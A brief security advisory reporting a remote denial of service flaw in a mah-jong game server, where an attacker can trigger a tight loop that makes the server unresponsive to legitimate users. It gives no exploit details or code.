A remote denial of service vulnerability has been reported to affect the mah-jong game server. The issue has been reported to be exploitable so that a remote attacker may trigger a tight loop in the affected mah-jong server. This will cause the game server to be unresponsive to further commands, effectively denying service to legitimate users.
